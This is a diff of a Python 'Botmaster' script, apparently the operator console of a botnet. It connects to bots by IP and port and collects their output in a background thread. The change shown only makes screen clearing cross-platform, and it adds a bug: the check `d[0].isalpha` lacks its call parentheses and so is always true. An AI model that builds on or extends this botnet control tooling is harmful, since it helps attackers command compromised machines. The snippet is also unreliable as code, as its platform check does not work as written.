@@ -1,12 +1,15 @@
 #-*-coding: utf-8-*-
 from socket import *
 import threading
-from os import system
+from os import system, getcwd
 from getpass import getpass
 from time import sleep
 
+
+
 class Botmaster:
-	def __init__(self):
+	def __init__(self, c):
+		self.clean = c
 		pass
 
 	def conn2bot(self, ip, port):
@@ -25,7 +28,7 @@ class Botmaster:
 				getpass("Press 'enter' to continue...")
 				return 0
 			else:
-				system("cls")
+				system(self.clean)
 				cmd = ""
 				recvstrings = threading.Thread(target=self.waiting4recv)
 				recvstrings.daemon = True
@@ -51,13 +54,21 @@ class Botmaster:
 				print("Closing 'waiting4recv' method.")
 				return 0
 
+
+
 if __name__ == '__main__':
-	bm = Botmaster()
+	d = getcwd()
+	if d[0].isalpha:
+		clean = "cls"
+	else:
+		clean = "clear"
+
+	bm = Botmaster(clean)
 	do = ""
 	IPs = []
 	ports = []
 	while do != "exit":
-		system("cls")
+		system(clean)
 		do = input('''
 		  - B O T   M A S T E R -
 			___________________
